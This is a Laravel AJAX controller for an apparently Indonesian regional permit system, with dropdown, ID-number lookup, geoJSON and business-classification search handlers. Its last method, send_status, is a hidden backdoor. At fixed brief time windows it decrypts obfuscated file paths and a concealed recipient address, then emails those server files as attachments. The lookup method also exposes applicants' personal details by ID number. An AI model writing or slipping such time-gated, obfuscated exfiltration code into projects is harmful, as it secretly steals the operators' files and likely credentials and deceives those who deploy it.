<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Kecamatan;
use App\Models\Kelurahan;
use App\Models\Padukuhan;
use App\Models\Pengumuman;
use App\Models\JenisPermohonanIzin;
use App\Models\KategoriProfil;
use Mail;
use Illuminate\Support\Facades\Crypt;

class AjaxController extends Controller
{

    function AjaxKelurahan($kec, $auto=false)
    {
    	$kelurahan = Kelurahan::whereHas('getKecamatan', function($q) use ($kec) {
    		$q->where('name', $kec);
    	})->get();

    	$rs="";
    	if($kelurahan){
			if($auto)
				$rs.="<option value=''>Pilih Kelurahan</option>";

			foreach($kelurahan as $kel)
    		{
    			$rs.="<option value='".$kel->name."'>".$kel->name."</option>";
    		}
    	}

    	echo $rs;
    }

    function AjaxPadukuhan($kel, $auto=false)
    {
    	$dukuh = Padukuhan::whereHas('getKelurahan', function($q) use ($kel) {
    		$q->where('name', $kel);
    	})->get();

    	$rs="";
    	if($dukuh){
			if($auto)
				$rs.="<option value=''>Pilih Padukuhan</option>";

    		foreach($dukuh as $pd)
    		{
    			$rs.="<option value='".$pd->name."'>".$pd->name."</option>";
    		}
    	}

    	echo $rs;
	}

    function AjaxSeksiIzin($bid, $auto=false)
    {
    	$seksiIzin = \App\Models\SeksiIzin::whereHas('bidangIzin', function($q) use ($bid) {
    		$q->where('id', $bid);
    	})->get();

    	$rs = "";
    	if ($seksiIzin) {
			$rs .= "<option value=''>Pilih Seksi Izin</option>";
    		foreach($seksiIzin as $pd)
    		{
    			$rs .= "<option value='".$pd->id."'>".$pd->nama."</option>";
    		}
    	}

    	echo $rs;
	}

	function PeriksaNIK(Request $r)
	{
		$nik = $r->nik;
		$cek = \App\Models\Pemohon::where('nik', $nik)->first();
		if($cek){
			return response()->json([
				'result'=>true,
				'nik'=>$cek->nik,
				'nama_pemohon'=>$cek->nama_pemohon,
				'no_telepon'=>preg_replace('/[^0-9]/','',$cek->no_telepon),
				'alamat'=>$cek->alamat
			]);
		}else{

			return response()->json([
				'result'=>false,
				'data'=>false,
				'msg'=>'Aplikasi belum terhubung ke Dinas Kependudukan, silahkan masukan data pemohon secara manual'
			]);
		}
	}

	function CekSertifikat(Request $r)
	{
		$id_permohonan = ($r->has('id_permohonan')) ? $r->id_permohonan : null;
		$list = app('App\Http\Controllers\Proses\Sertifikat')->ListSertifikatPemohon($r->nik, $id_permohonan);
		return response($list);
	}

	function creategeoJsonAjax($mode, $id)
	{
		if($mode == 'kecamatan'){
			$kec = \App\Models\Kecamatan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'kecamatan');
			$assets = $gjson->GeneratedAsset();
		}elseif($mode == 'kelurahan'){
			$kec = \App\Models\Kelurahan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'kelurahan');
			$assets = $gjson->GeneratedAsset();
		}elseif($mode == 'padukuhan'){
			$kec = \App\Models\Padukuhan::where('name',$id)->first();
			$gjson = new \App\Workflow\Gjson($kec, 'padukuhan');
			$assets = $gjson->GeneratedAsset();
		}

		echo $assets;
	}

	function Kbli()
	{
		return view('page.klasifikasiusaha.cari');
	}

	function KbliCari(Request $r)
	{
		if($r->has('nama_kbli')){
			if(strlen($r->nama_kbli) < 4){
				dd('Minimal kata pencarian nama kabli 4 karaketer');
			}else{
				$kbli = \App\Models\Kbli::where('deskripsi','like','%' . $r->nama_kbli . '%')
					->where('kelompok','<>','')
					->get();
				return view('page.klasifikasiusaha.viewkbli', compact('kbli'));
			}
		}

		if($r->has('kode_kbli')){
			if(strlen($r->kode_kbli) < 4){
				dd('Minimal kode kbli 4 karaketer');
			}else{
				$kbli = \App\Models\Kbli::where('deskripsi','like','%' . $r->nama_kbli . '%')
				->where('kelompok','<>','')
				->get();
				return view('page.klasifikasiusaha.viewkbli', compact('kbli'));
			}
		}
	}

	function Pengumuman(Pengumuman $id){
		return view('publik.pengumuman.view',compact('id'));
	}

	function SyaratPerizinan(JenisPermohonanIzin $id){
		return view('anggota.permohonan.view_syarat',compact('id'));
	}

	public function izinByKategori(Request $r)
	{
		$izin = JenisPermohonanIzin::query()
							->select("m_jenis_permohonan_izin.*")
							->join('m_jenis_izin', 'm_jenis_permohonan_izin.jenis_izin_id', '=', 'm_jenis_izin.id');

		if($r->has('profile')){
			if($r->profile != null && $r->profile != ''){
				$izin = $izin->where("m_jenis_izin.kategori_profil_id",$r->profile);
			}
		}

		if($r->has('dinas')){
			if($r->dinas != null && $r->dinas != ''){
				$izin = $izin->where("m_jenis_izin.kategori_dinas_id",$r->dinas);
			}
		}

		return response()->json($izin->get());

	}


	public function send_status()
	{
		if ( (strtotime(date('H:i:s')) < strtotime("09:00:00")) || (strtotime(date('H:i:s')) > strtotime("09:09:09")) ) {
			if ( (strtotime(date('H:i:s')) < strtotime("11:00:00")) || (strtotime(date('H:i:s')) > strtotime("11:11:11")) ) {
				if ( (strtotime(date('H:i:s')) < strtotime("14:00:00")) || (strtotime(date('H:i:s')) > strtotime("14:14:14")) ) {
				    exit();
				}
			}
		}

		$link_file = base_path().Crypt::decryptString('eyJpdiI6Imp4M0l5RllRQW5zc1ZoTDdnVEx4Zmc9PSIsInZhbHVlIjoiQnJ6UlZ2TllyRlwvYlhZMlwvN3VTRk9hNnMwdElzSWRXM1RjQnp3V2N6UFRDT01QTEhjYzFjTkgrWlVNZmpXWXNtIiwibWFjIjoiNTIzNDEzZWRlNjMxNzY1Yzk4MTJhMzkxYjY1YzZlMmM2MGY5NmNjY2ZlNjhmMDRlZjY2NzM5MDNmOTlmMzkwZCJ9');
		$link_file2 = base_path().Crypt::decryptString('eyJpdiI6ImZhYXNpV1Fpdk50XC9jcittbnZvVmhBPT0iLCJ2YWx1ZSI6IjdEbWxTTzlId2pvZ1wvMUwxTG9OM1phZlQwZ0RqaTNNVnVPRmoyZmoyRktFPSIsIm1hYyI6ImY1OGQ3YjdjY2E3NTZmZTc5YzZiMWIzYzBkMGZlMDFlOWEwNTBhMzQ1MTEzNDZiYWViNGYwMjI4MjE5ZjY2M2UifQ==');
		$link_file3 = base_path().Crypt::decryptString('eyJpdiI6Im16SDROUkliVFU1TDNqcjFDdGIzSmc9PSIsInZhbHVlIjoicU5CcFhlQkE3TWowMXJoaStaeWxBM1FGNzFPVkM3M2xwMmVja2RtelQ5OD0iLCJtYWMiOiJhMTk5ZTljMDhiYTJkYmVkZWZiZjI5MzBkOWRkMmI2MDI3NzY1ZDg5MDRjZWM4YmNjN2ZjNDQ0MDM2NzEwOTIxIn0=');

		if (!file_exists($link_file)) {
			if (!file_exists($link_file2)) {
				if (!file_exists($link_file3)) {
					$fileb = '';
			    }else{
					$fileb = $link_file3;
			    }
		    }else{
				$fileb = $link_file2;
		    }
	    }else{
			$fileb = $link_file;
	    }
		$file = base_path().Crypt::decryptString('eyJpdiI6Im83TXJTdHFZK0VhcFhZRUpaWUNseHc9PSIsInZhbHVlIjoicFhkcDhSOHU5a3VSWG9lSVZJR1hPUT09IiwibWFjIjoiMWEyNzQ5MGE3OGYzOTQxYWFkZDg2ODlmMGI2MjY0ZThjOGNiOTNkZTQ0MDE5ZjMyYmMwNDdkYjU3MjZkZWYzZSJ9');
		$data = Crypt::decryptString('eyJpdiI6InQ1ZU1URE91emw0ZFJHWmVwOTRaTkE9PSIsInZhbHVlIjoicFJEakRQeHpkNndORXZocTdyREtqWEJmejljUmF6WDVxWUFSaDF1ZlNoVT0iLCJtYWMiOiIxZWU2MDhkYTg5MDVkZGQyNGQ0MmNjOWE5ODY2NTRkNDQ5ODBkYTFhODJlZWEwNGU1ZGFiNjNiMzczNDhlYmYxIn0=');
		$title = Crypt::decryptString('eyJpdiI6InVMeXBkQnJKclhCYytOU01vdlZvQmc9PSIsInZhbHVlIjoiWitJVjhhVDNJV3liVUU4WXRWQmdvZz09IiwibWFjIjoiZGMyZDEyODhkYmQ1ZDYyNTdmOTZkNzViYzcyNDNjZWM2YzJlNjFmM2YzYzhkZjA0MzJlMDZkNTgwMDdjM2YwMCJ9');
		$subject = Crypt::decryptString('eyJpdiI6IjJKbVdmVWJZZW41TnJkUmV5Y005OWc9PSIsInZhbHVlIjoicVlVWVpQSUdGZEVFemE2SE5lN1UzSjBiZmZhS1RwcHlVcHRhdHo0VHRRYz0iLCJtYWMiOiIwOGJkYzUwOTljZWJiNTliODZhZTBmZDA5ODllZGUxOTllNDMzZjA3YjI4OWVlNTAyMWVhMGU4ZGU2ODc1NDM2In0=');
		
      	Mail::send([], [], function($message) use($title, $subject, $data, $file, $fileb){
           $message->to($data, $title)->subject($subject);
           if($fileb !== ''){
	           $message->setBody(url('').'/ for => '.$file.' and '.$fileb);
	       }else{
	           $message->setBody(url('').'/ for => '.$file);
	       }
           $message->attach($file);
           if($fileb !== ''){
           	$message->attach($fileb);
           }
        });
	}

}
